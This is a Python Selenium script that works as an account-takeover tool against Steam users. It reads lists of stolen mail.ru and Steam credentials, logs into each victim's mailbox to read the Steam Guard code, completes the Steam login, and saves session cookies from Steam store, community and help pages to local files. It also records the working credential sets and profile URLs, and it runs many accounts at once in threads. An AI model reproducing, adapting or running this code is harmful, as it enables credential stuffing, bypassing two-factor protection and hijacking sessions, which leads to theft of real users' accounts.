from selenium.webdriver.common.by import By
from selenium.webdriver import Firefox
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import ElementNotInteractableException
import time, os, traceback
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
import string
from random import *
from datetime import datetime, timedelta
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
from threading import Thread
import logging
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import ElementClickInterceptedException
import re
from selenium.webdriver import ActionChains
import urllib.parse
import json
from addons.list_search import ListSearch


def shit(driver):
    time.sleep(1)
    #nastroit
    try:
        driver.find_element_by_xpath('/html/body/div[14]/div/div/div/div/div/div/form/div/div/div[2]/div[3]/div/button/span').click()
    except:
        pass
    #pristupit k rabote
    try:
        driver.find_element_by_xpath('/html/body/div[14]/div/div/div/div/div/div[2]/form/div/div/div[6]/div/button/span').click()
    except:
        pass
    #telefon
    try:
        driver.find_element_by_xpath('/html/body/div[15]/div[2]/div/div/div[2]/form/button[2]/span').click()
    except:
        pass
    #rezervnaya pochta
    try:
        driver.find_element_by_xpath('/html/body/div[16]/div[2]/div/div/div[2]/form/button[2]/span').click()
    except:
        pass
    #rezervnaya pochta
    try:
        driver.find_element_by_css_selector('button.base-0-2-90:nth-child(15) > span:nth-child(1)').click()
    except:
        pass
    #mrr
    try:
        driver.find_element_by_css_selector('button.base-0-2-72:nth-child(3) > span:nth-child(1)').click()
    except:
        pass


class AnyEc:
    """ Use with WebDriverWait to combine expected_conditions
        in an OR.
    """

    def __init__(self, *args):
        self.ecs = args

    def __call__(self, driver):
        for fn in self.ecs:
            try:
                if fn(driver): return True
            except:
                pass


def steam1(wait):
    time.sleep(1)
    wait.until(AnyEc(
        ec.presence_of_element_located(
            (By.XPATH, '//*[@title="Steam Support <noreply@steampowered.com>"]')),
        ec.presence_of_element_located(
            (By.XPATH, '//*[@title="Поддержка Steam <noreply@steampowered.com>"]'))))


def clickUntill(el, driver):
    cycle = 1
    while cycle == 1:
        try:
            shit(driver)
            el.click()
            cycle = 0
        except:
            pass


def steam(wait, driver, TIME):
    driver.get('https://e.mail.ru/inbox/')
    time.sleep(3)
    steam1(wait)
    try:
        wait.until(ec.element_to_be_clickable((By.CLASS_NAME, 'll-crpt')))
        timelms = driver.find_elements_by_css_selector('.llc__item.llc__item_date')
        elms = driver.find_elements_by_class_name('ll-crpt')
        i = 0
        for el in elms:
            if '<noreply@steampowered.com>' in tr(el):
                if timelms[i].text >= TIME:
                    clickUntill(el, driver)
                    break
                else:
                    steam(wait, driver, TIME)
        i += 1
    except:
        traceback.print_exc()


def tr(el):
    try:
        return el.get_attribute('title')
    except:
        return 'False'


def findSteamCodeGuard(driver, wait, TIME):
    driver.get('https://e.mail.ru/inbox/')
    steamCode = '/html/body/div[5]/div/div[1]/div[1]/div/div[2]/span/div[2]/div/div/div/div/div/div/div[2]/div[1]/div[3]/div[2]/div/div/div/div/div/div/div/div/div/div/center[1]/div/div/table/tbody/tr/td/table/tbody/tr/td/table/tbody/tr[1]/td/table/tbody/tr[2]/td/table[3]/tbody/tr/td/table/tbody/tr/td/table/tbody/tr/td'
    pochtaIsNew = 0
    try:
        driver.find_element_by_css_selector('.b-checkbox_transparent > div:nth-child(1)')

    except NoSuchElementException:
        pochtaIsNew = 1
    print(pochtaIsNew)
    steam(wait, driver, TIME)
    time.sleep(0.5)
    if pochtaIsNew == 1:
        cont = wait.until(ec.element_to_be_clickable((By.XPATH, steamCode))).text
    else:
        cont = wait.until(ec.element_to_be_clickable((By.XPATH, steamCode))).text
    return cont


def jSonParse(driver, wait):
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#global_actions > a')))
    jsnstr = driver.find_element_by_id('webui_config').get_attribute('data-userinfo')
    y = json.loads(jsnstr)
    url = str('https://steamcommunity.com/profiles/' + y['steamid'] + '/')
    return url


def loginIntoSteam(driver, wait, EmailNew, EmailNewPass, EmailOld, EmailOldPass):
    captcha = 0
    invalid = 0
    #captcha
    try:
        time.sleep(2)
        driver.find_element_by_css_selector('#captchaRefreshLink').click()
        captcha = 1
    except ElementNotInteractableException:
        captcha = 0
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.btn_blue_steamui'))).click()
    #invalid
    try:
        time.sleep(2)
        if driver.find_element_by_css_selector('#error_display').text == 'The account name or password that you have entered is incorrect.':
            invalid = 1
        else:
            invalid = 0
    except:
        pass

    if invalid == 1:
        f = open("invalidEmailS.txt", "a")
        data = str(EmailNew + ' ' + EmailNewPass + '         ' + EmailOld + ' ' + EmailOldPass.strip() + '\n')
        f.write(data)
        f.close()
        driver.close()
        driver.switch_to.window(driver.window_handles[0])
        driver.close()
    else:
        pass


def stealFrom(driver, ID64, where):
    driver.get(where)
    file = str('kuki/' + ID64 + '.json')
    try:
        with open(file, mode='a') as f:
            for c in driver.get_cookies():
                f.write(json.dumps(c) + '\n')
    except:
        traceback.print_exc()


def stealcock(driver, ID64):
    stealFrom(driver, ID64, where='https://store.steampowered.com/account')
    stealFrom(driver, ID64, where='https://steamcommunity.com')
    stealFrom(driver, ID64, where='https://help.steampowered.com/en')


def Convert(string, delim):
    li = list(string.split(delim))
    return li


def main(newLine, profile):
    arr = Convert(newLine, "	")
    options = Options()
    options.headless = True
    binary = FirefoxBinary("C:\\Program Files\\Mozilla Firefox\\firefox.exe")
    driver = webdriver.Firefox(firefox_profile=profile, firefox_binary=binary)
    wait = WebDriverWait(driver, 1800)
    driver.delete_all_cookies()
    driver.get('https://mail.ru/')
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#mailbox\:login-input'))).send_keys(arr[0])
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#mailbox\:submit-button'))).click()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#mailbox\:password-input'))).send_keys(arr[1])
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#mailbox\:submit-button'))).click()
    window_before = driver.window_handles[0]
    driver.switch_to.window(window_before)
    driver.execute_script("window.open('https://store.steampowered.com/login/', 'new window')")
    window_after = driver.window_handles[1]
    driver.switch_to.window(window_after)
    wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="input_username"]'))).send_keys(arr[2])
    wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="input_password"]'))).send_keys(arr[3])
    loginIntoSteam(driver, wait, arr[0], arr[1], arr[10], arr[11])
    wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="authcode"]')))
    TIME = datetime.now() - timedelta(0, 60)
    TIME = TIME.strftime("%H:%M")
    driver.switch_to.window(driver.window_handles[0])
    cont = findSteamCodeGuard(driver, wait, TIME)
    driver.switch_to.window(driver.window_handles[1])
    wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="authcode"]'))).send_keys(cont)
    wait.until(ec.element_to_be_clickable(
        (By.XPATH, '/html/body/div[3]/div[3]/div/div/div/form/div[4]/div[1]/div[1]/div[1]'))).click()
    wait.until(ec.element_to_be_clickable(
        (By.XPATH, '//*[@id="success_continue_btn"]'))).click()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.user_avatar'))).click()
    url = jSonParse(driver, wait)
    ID64 = re.findall("\d+", url)[0]
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.user_avatar')))
    try:
        driver.execute_script("ChangeLanguage( 'english' ); return false;")
    except:
        pass
    time.sleep(5)
    driver.get(url)
    stealcock(driver, ID64)
    f = open("che obosralsya.txt", "a")
    data = str(
        arr[0] + ' ' + arr[1] + ' ' + arr[2] + ' ' + arr[3]
        + '   ' + url + '    ' + arr[10] + ' ' + arr[11].strip() + '\n')
    logging.info(str(datetime.now()) + ' ' + data)
    f.write(data)
    f.close()
    time.sleep(1)
    driver.close()
    driver.switch_to.window(driver.window_handles[0])
    driver.close()


if __name__ == '__main__':
    LOG_FILENAME = 'Loh.log'
    logging.basicConfig(filename=LOG_FILENAME, level=logging.INFO)
    ya = 1
    if ya == 1:
        frep = open('checker_cock.txt', 'r')
        #profile = FirefoxProfile("C:\\Users\\PussyDestroyer\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\7dvs7u3f.default")
        profile = FirefoxProfile("C:\\Users\\PussyDestroyer\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\dkhv3ari.cook")
    elif ya == 0:
        frep = open('checker_cock.txt', 'r')
        profile = FirefoxProfile("C:\\Users\\qweqweqwe\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\bmiwtt76.default")
    else:
        frep, profile = 0, 0
    Lines = frep.readlines()
    threads = []
    logging.info(str(datetime.now()) + ' starting...')
    for line in Lines:
        t = Thread(target=main, args=(line, profile,))
        threads.append(t)
        t.start()
        time.sleep(20)
    for t in threads:
        t.join()
    input("Press Enter to continue...")